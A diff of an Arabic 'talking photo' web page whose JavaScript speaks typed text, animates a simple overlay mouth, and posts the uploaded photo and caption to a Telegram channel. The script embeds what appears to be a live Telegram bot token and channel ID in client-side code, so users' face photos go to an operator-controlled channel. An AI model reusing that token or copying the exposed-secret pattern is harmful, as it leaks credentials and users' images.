@@ -2,192 +2,511 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>الصورة الناطقة - نص إلى كلام</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lip Sync - صورتك تتكلم</title>
     <!-- Font Awesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
             font-family: 'Cairo', sans-serif;
-            background: linear-gradient(135deg, #1a0f2a, #2d1a4a);
+            background: linear-gradient(135deg, #0a1a2f, #1a3f4a);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             color: white;
             padding: 20px;
         }
-        .container { max-width: 600px; margin: auto; }
+
+        .container {
+            max-width: 600px;
+            width: 100%;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .header h1 {
+            color: #00ffaa;
+            font-size: 40px;
+            text-shadow: 0 0 20px rgba(0,255,170,0.5);
+        }
+
         .card {
-            background: rgba(255,255,255,0.1);
-            border: 3px solid #ff6b6b;
-            border-radius: 30px;
+            background: rgba(255,255,255,0.05);
+            backdrop-filter: blur(10px);
+            border: 3px solid #00ffaa;
+            border-radius: 40px;
             padding: 30px;
+            box-shadow: 0 0 50px rgba(0,255,170,0.2);
+        }
+
+        /* منطقة الصورة */
+        .image-area {
+            position: relative;
+            width: 300px;
+            height: 300px;
+            margin: 0 auto 30px;
+            border-radius: 50%;
+            overflow: hidden;
+            border: 4px solid #00ffaa;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            cursor: pointer;
+        }
+
+        #uploadedImage {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: none;
+        }
+
+        .upload-placeholder {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background: rgba(0,255,170,0.1);
+            color: #00ffaa;
+        }
+
+        .upload-placeholder i {
+            font-size: 80px;
+            margin-bottom: 15px;
+        }
+
+        /* قناع الفم (متحرك) */
+        .mouth-mask {
+            position: absolute;
+            bottom: 60px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100px;
+            height: 40px;
+            background: rgba(0,0,0,0.5);
+            border-radius: 20px;
+            overflow: hidden;
+            border: 2px solid #00ffaa;
+            display: none;
+        }
+
+        .mouth-animation {
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(180deg, #ff6b6b, #ff4757);
+            transform-origin: top;
+            transition: transform 0.05s;
+        }
+
+        /* منطقة النص */
+        .text-area {
             margin: 20px 0;
         }
-        .btn {
-            background: #ff6b6b;
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            border-radius: 50px;
-            font-size: 18px;
-            cursor: pointer;
-            margin: 10px;
-        }
-        .textarea {
+
+        textarea {
             width: 100%;
             padding: 15px;
-            background: rgba(255,255,255,0.1);
-            border: 2px solid #ff6b6b;
-            border-radius: 15px;
+            background: rgba(0,0,0,0.3);
+            border: 2px solid #00ffaa;
+            border-radius: 20px;
             color: white;
-            margin: 10px 0;
+            font-size: 16px;
+            resize: vertical;
+            min-height: 100px;
+            font-family: 'Cairo', sans-serif;
+        }
+
+        textarea:focus {
+            outline: none;
+            box-shadow: 0 0 20px #00ffaa;
+        }
+
+        /* أزرار التحكم */
+        .controls {
+            display: flex;
+            gap: 15px;
+            margin: 25px 0;
+            flex-wrap: wrap;
+        }
+
+        .btn {
+            flex: 1;
+            padding: 15px 25px;
+            border: none;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: all 0.3s;
+            min-width: 140px;
+        }
+
+        .btn-primary {
+            background: #00ffaa;
+            color: black;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 30px #00ffaa;
+        }
+
+        .btn-secondary {
+            background: transparent;
+            border: 2px solid #00ffaa;
+            color: #00ffaa;
+        }
+
+        .btn-secondary:hover {
+            background: #00ffaa;
+            color: black;
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        /* البصمة */
+        .fingerprint {
+            background: rgba(0,255,170,0.1);
+            border: 2px solid #00ffaa;
+            border-radius: 20px;
+            padding: 15px;
+            margin: 20px 0;
+            text-align: center;
+            font-family: monospace;
+            font-size: 24px;
+            direction: ltr;
+        }
+
+        .copy-btn {
+            background: none;
+            border: 1px solid #00ffaa;
+            color: #00ffaa;
+            padding: 5px 15px;
+            border-radius: 20px;
+            margin-right: 10px;
+            cursor: pointer;
+        }
+
+        .copy-btn:hover {
+            background: #00ffaa;
+            color: black;
+        }
+
+        /* مؤشر التسجيل */
+        .status {
+            text-align: center;
+            margin: 15px 0;
+            color: #00ffaa;
+            font-size: 18px;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+
+        .recording {
+            animation: pulse 1s infinite;
+            color: #ff4757;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1 style="color: #ff6b6b; text-align: center;">
-            <i class="fas fa-robot"></i>
-            الصورة الناطقة - بدون ميكروفون
-        </h1>
+        <div class="header">
+            <h1>
+                <i class="fas fa-face-smile"></i>
+                صورتك تتكلم
+            </h1>
+        </div>
 
         <div class="card">
-            <!-- رفع الصورة -->
-            <div style="border: 3px dashed #ff6b6b; border-radius: 20px; padding: 30px; text-align: center; cursor: pointer;" onclick="document.getElementById('imageFile').click()">
-                <i class="fas fa-cloud-upload-alt" style="font-size: 50px; color: #ff6b6b;"></i>
-                <h3>اضغط لرفع الصورة</h3>
+            <!-- منطقة الصورة -->
+            <div class="image-area" onclick="document.getElementById('imageInput').click()">
+                <img id="uploadedImage" src="" alt="صورتك">
+                <div class="upload-placeholder" id="uploadPlaceholder">
+                    <i class="fas fa-cloud-upload-alt"></i>
+                    <span>اضغط لرفع الصورة</span>
+                </div>
+                
+                <!-- قناع الفم المتحرك -->
+                <div class="mouth-mask" id="mouthMask">
+                    <div class="mouth-animation" id="mouthAnimation"></div>
+                </div>
             </div>
-            
-            <input type="file" id="imageFile" accept="image/*" style="display: none;" onchange="previewImage(this)">
 
-            <!-- معاينة الصورة -->
-            <div id="imagePreview" style="display: none; margin: 20px 0;">
-                <img id="preview" style="width: 100%; border-radius: 15px; border: 3px solid #ff6b6b;">
-            </div>
+            <input type="file" id="imageInput" accept="image/*" style="display: none;" onchange="handleImageUpload(this)">
 
-            <!-- النص المراد تحويله لكلام -->
-            <textarea id="speechText" class="textarea" rows="4" placeholder="اكتب هنا الكلمات التي تريد أن تنطقها الصورة..."></textarea>
-
-            <!-- اختيار الصوت -->
-            <select id="voiceSelect" class="textarea">
-                <option value="ar-SA">عربي - سعودي</option>
-                <option value="ar-EG">عربي - مصري</option>
-                <option value="en-US">إنجليزي - أمريكي</option>
-            </select>
-
-            <!-- البصمة -->
-            <div style="background: rgba(255,107,107,0.1); padding: 15px; border-radius: 10px; margin: 20px 0;">
-                <i class="fas fa-fingerprint" style="color: #ff6b6b;"></i>
-                بصمة: <span id="thumbprint">LIP_1002_260313_...</span>
-                <button onclick="copyThumbprint()" style="background: none; border: 1px solid #ff6b6b; color: #ff6b6b; padding: 5px 10px; border-radius: 5px; margin-right: 10px;">
-                    نسخ
-                </button>
+            <!-- منطقة النص -->
+            <div class="text-area">
+                <textarea id="speechText" placeholder="اكتب هنا النص الذي تريد أن تنطقه الصورة..." maxlength="300"></textarea>
             </div>
 
             <!-- أزرار التحكم -->
-            <div style="display: flex; gap: 10px;">
-                <button class="btn" onclick="testVoice()" style="flex: 1;">
-                    <i class="fas fa-play"></i> اختبار الصوت
+            <div class="controls">
+                <button class="btn btn-primary" onclick="speakNow()" id="speakBtn">
+                    <i class="fas fa-play"></i>
+                    تحدث الآن
                 </button>
-                <button class="btn" onclick="sendToTelegram()" style="flex: 2;">
-                    <i class="fas fa-paper-plane"></i> إرسال
+                <button class="btn btn-secondary" onclick="sendToTelegram()" id="sendBtn">
+                    <i class="fas fa-paper-plane"></i>
+                    إرسال
                 </button>
+            </div>
+
+            <!-- البصمة -->
+            <div class="fingerprint">
+                <i class="fas fa-fingerprint" style="color: #00ffaa;"></i>
+                <span id="thumbprint">LIP_1002_260313_...</span>
+                <button class="copy-btn" onclick="copyThumbprint()">
+                    <i class="fas fa-copy"></i>
+                </button>
+            </div>
+
+            <!-- حالة التسجيل -->
+            <div class="status" id="status">
+                <i class="fas fa-microphone"></i>
+                جاهز للتحدث
             </div>
         </div>
     </div>
 
     <script>
-        // إعدادات تيليجرام
+        // ========== إعدادات ==========
         const TELEGRAM = {
             botToken: '8576673096:AAEFKd-YSJcW_0d_wAHZBt-5nPg_VOjDX_0',
             channelId: '-1003822964890'
         };
 
+        // ========== متغيرات ==========
         let selectedImage = null;
+        let isSpeaking = false;
         let currentThumbprint = '';
+        let speechSynthesisUtterance = null;
 
-        // توليد بصمة
+        // ========== توليد بصمة ==========
         function generateThumbprint() {
             const date = new Date();
-            const time = `${date.getHours()}${date.getMinutes()}${date.getSeconds()}`;
-            currentThumbprint = `LIP_1002_${time}`;
+            const hours = date.getHours().toString().padStart(2, '0');
+            const minutes = date.getMinutes().toString().padStart(2, '0');
+            const seconds = date.getSeconds().toString().padStart(2, '0');
+            currentThumbprint = `LIP_1002_${hours}${minutes}${seconds}`;
             document.getElementById('thumbprint').textContent = currentThumbprint;
         }
         setInterval(generateThumbprint, 1000);
 
-        // معاينة الصورة
-        function previewImage(input) {
+        // ========== رفع الصورة ==========
+        function handleImageUpload(input) {
             if (input.files && input.files[0]) {
                 selectedImage = input.files[0];
+                
                 const reader = new FileReader();
-                reader.onload = e => {
-                    document.getElementById('preview').src = e.target.result;
-                    document.getElementById('imagePreview').style.display = 'block';
-                }
+                reader.onload = function(e) {
+                    const img = document.getElementById('uploadedImage');
+                    img.src = e.target.result;
+                    img.style.display = 'block';
+                    
+                    document.getElementById('uploadPlaceholder').style.display = 'none';
+                    
+                    // إظهار قناع الفم
+                    document.getElementById('mouthMask').style.display = 'block';
+                    
+                    // تحديد مكان الفم بناء على الصورة (افتراضي)
+                    positionMouth();
+                };
                 reader.readAsDataURL(selectedImage);
             }
         }
 
-        // اختبار الصوت (Text-to-Speech)
-        function testVoice() {
-            const text = document.getElementById('speechText').value;
-            if (!text) {
-                alert('اكتب نصاً أولاً');
-                return;
-            }
-            
-            const utterance = new SpeechSynthesisUtterance(text);
-            utterance.lang = document.getElementById('voiceSelect').value;
-            utterance.rate = 1;
-            utterance.pitch = 1;
-            window.speechSynthesis.speak(utterance);
-            
-            // تفعيل حركة الفم (محاكاة)
-            document.body.style.animation = 'none';
-            setTimeout(() => {
-                document.body.style.animation = 'pulse 1s infinite';
-            }, 100);
+        // ========== تحديد مكان الفم ==========
+        function positionMouth() {
+            // هنا يمكن تعديل مكان الفم بناء على الصورة
+            // حالياً يبقى في الوضع الافتراضي
         }
 
-        // إرسال إلى تيليجرام
+        // ========== تحريك الشفاه مع الكلام ==========
+        function speakNow() {
+            const text = document.getElementById('speechText').value.trim();
+            
+            if (!text) {
+                alert('الرجاء كتابة نص للتحدث');
+                return;
+            }
+
+            if (!selectedImage) {
+                alert('الرجاء رفع صورة أولاً');
+                return;
+            }
+
+            // إيقاف أي كلام سابق
+            if (speechSynthesis.speaking) {
+                speechSynthesis.cancel();
+            }
+
+            // بدء كلام جديد
+            speechSynthesisUtterance = new SpeechSynthesisUtterance(text);
+            
+            // اختيار صوت عربي
+            const voices = speechSynthesis.getVoices();
+            const arabicVoice = voices.find(voice => voice.lang.includes('ar'));
+            if (arabicVoice) {
+                speechSynthesisUtterance.voice = arabicVoice;
+            }
+            
+            speechSynthesisUtterance.lang = 'ar-SA';
+            speechSynthesisUtterance.rate = 0.9;
+            speechSynthesisUtterance.pitch = 1;
+
+            // بدء تحريك الشفاه
+            speechSynthesisUtterance.onstart = () => {
+                isSpeaking = true;
+                document.getElementById('status').innerHTML = '<i class="fas fa-microphone-alt recording"></i> تتحدث...';
+                document.getElementById('speakBtn').innerHTML = '<i class="fas fa-stop"></i> إيقاف';
+            };
+
+            // تحريك الشفاه أثناء الكلام
+            speechSynthesisUtterance.onboundary = (event) => {
+                if (event.name === 'word') {
+                    // فتح الفم عند بداية الكلمة
+                    animateMouth(true);
+                    
+                    // إغلاق الفم بعد فترة قصيرة
+                    setTimeout(() => {
+                        animateMouth(false);
+                    }, 150);
+                }
+            };
+
+            // نهاية الكلام
+            speechSynthesisUtterance.onend = () => {
+                isSpeaking = false;
+                document.getElementById('status').innerHTML = '<i class="fas fa-microphone"></i> جاهز للتحدث';
+                document.getElementById('speakBtn').innerHTML = '<i class="fas fa-play"></i> تحدث الآن';
+                resetMouth();
+            };
+
+            speechSynthesis.speak(speechSynthesisUtterance);
+        }
+
+        // ========== تحريك الفم ==========
+        function animateMouth(open) {
+            const mouth = document.getElementById('mouthAnimation');
+            if (open) {
+                // فتح الفم بشكل عشوائي لمحاكاة الكلام
+                const openAmount = 0.3 + Math.random() * 0.7;
+                mouth.style.transform = `scaleY(${openAmount})`;
+                mouth.style.background = '#ff4757';
+            } else {
+                // إغلاق الفم
+                mouth.style.transform = 'scaleY(1)';
+                mouth.style.background = '#ff6b6b';
+            }
+        }
+
+        // ========== إعادة تعيين الفم ==========
+        function resetMouth() {
+            document.getElementById('mouthAnimation').style.transform = 'scaleY(1)';
+        }
+
+        // ========== إيقاف الكلام ==========
+        function stopSpeaking() {
+            if (speechSynthesis.speaking) {
+                speechSynthesis.cancel();
+                isSpeaking = false;
+                document.getElementById('status').innerHTML = '<i class="fas fa-microphone"></i> جاهز للتحدث';
+                document.getElementById('speakBtn').innerHTML = '<i class="fas fa-play"></i> تحدث الآن';
+                resetMouth();
+            }
+        }
+
+        // ========== إرسال إلى تيليجرام ==========
         async function sendToTelegram() {
             if (!selectedImage) {
-                alert('الرجاء رفع صورة');
+                alert('الرجاء رفع صورة أولاً');
                 return;
             }
 
-            const text = document.getElementById('speechText').value;
+            const text = document.getElementById('speechText').value.trim();
             if (!text) {
-                alert('الرجاء كتابة النص');
+                alert('الرجاء كتابة نص للتحدث');
                 return;
             }
 
-            // إرسال الصورة
+            // إيقاف أي كلام جاري
+            stopSpeaking();
+
+            // تجهيز البيانات
             const formData = new FormData();
             formData.append('chat_id', TELEGRAM.channelId);
             formData.append('photo', selectedImage);
-            formData.append('caption', `🖼️ ${text}\n🔍 ${currentThumbprint}`);
+            
+            const caption = `🖼️ **صورة ناطقة**\n\n💬 **النص:** ${text}\n🔍 **البصمة:** \`${currentThumbprint}\`\n\n✅ تم الإنشاء بواسطة Lip Sync`;
+            formData.append('caption', caption);
 
             try {
+                document.getElementById('status').innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري الإرسال...';
+                
                 const response = await fetch(`https://api.telegram.org/bot${TELEGRAM.botToken}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
 
                 const data = await response.json();
-                
+
                 if (data.ok) {
-                    alert('✅ تم الإرسال بنجاح');
+                    document.getElementById('status').innerHTML = '<i class="fas fa-check-circle"></i> تم الإرسال بنجاح ✅';
+                    
+                    // تنظيف الحقول
+                    document.getElementById('speechText').value = '';
+                    
+                    setTimeout(() => {
+                        document.getElementById('status').innerHTML = '<i class="fas fa-microphone"></i> جاهز للتحدث';
+                    }, 3000);
                 } else {
-                    alert('❌ فشل الإرسال: ' + data.description);
+                    throw new Error(data.description);
                 }
             } catch (error) {
-                alert('❌ خطأ في الاتصال');
+                document.getElementById('status').innerHTML = '<i class="fas fa-exclamation-circle"></i> خطأ في الإرسال ❌';
+                console.error(error);
             }
         }
 
-        // نسخ البصمة
+        // ========== نسخ البصمة ==========
         function copyThumbprint() {
             navigator.clipboard.writeText(currentThumbprint);
-            alert('تم النسخ');
+            alert('✅ تم نسخ البصمة');
         }
+
+        // ========== تحميل الأصوات المتاحة ==========
+        window.speechSynthesis.onvoiceschanged = function() {
+            const voices = speechSynthesis.getVoices();
+            console.log('الأصوات المتاحة:', voices);
+        };
+
+        // ========== إيقاف الكلام عند إغلاق الصفحة ==========
+        window.onbeforeunload = function() {
+            if (speechSynthesis.speaking) {
+                speechSynthesis.cancel();
+            }
+        };
     </script>
 </body>
 </html>
